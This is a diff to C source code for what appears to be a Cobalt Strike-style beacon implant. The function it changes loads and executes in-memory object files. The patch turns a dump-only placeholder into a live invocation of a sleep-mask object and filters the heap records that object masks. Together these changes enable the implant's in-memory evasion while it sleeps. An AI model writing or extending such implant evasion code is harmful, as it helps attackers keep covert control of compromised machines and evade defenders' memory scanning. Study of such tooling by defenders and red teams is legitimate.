@@ -633,12 +633,18 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 				if (info.sections == NULL)
 					info.sections = empty_sections;
 				info.heap_records = track_memory_get_heap_records_to_mask();
-				/*
-				 * Stock sleepmask.x64.o: mov r10,[rcx+8] then DWORD pairs;
-				 * mov rax,[rcx] as image base. That is GARGLEP (beacon_ptr,
-				 * sections), not OpenBeacon BEACON_INFO (ptr, sizes, ...).
-				 * Fill BEACON_INFO then pass a GARGLEP rcx the object can walk.
-				 */
+				if (info.heap_records != NULL && info.sections != NULL) {
+					int r, w;
+					for (r = 0, w = 0; ; r++) {
+						if (info.heap_records[r].ptr == (char *)info.sections)
+							continue;
+						if (w != r)
+							info.heap_records[w] = info.heap_records[r];
+						if (info.heap_records[r].ptr == NULL)
+							break;
+						w++;
+					}
+				}
 				if (gparms != NULL) {
 					gparms->beacon_ptr = info.beacon_ptr;
 					gparms->sections = info.sections;
@@ -648,8 +654,10 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 #if defined(_M_X64)
 				sm_dump_gparms(gparms, code_dst, total, t);
 #endif
-				/* Capture-only: dump then Sleep. Do not invoke until dump is read. */
-				Sleep(t);
+				if (gparms == NULL)
+					Sleep(t);
+				else
+					((void (*)(GARGLEP *, void *, DWORD))inlinefunc)(gparms, (void *)Sleep, t);
 				beacon_sleep_mask_set_exec(NULL, 0, 0);
 			}
 			else {
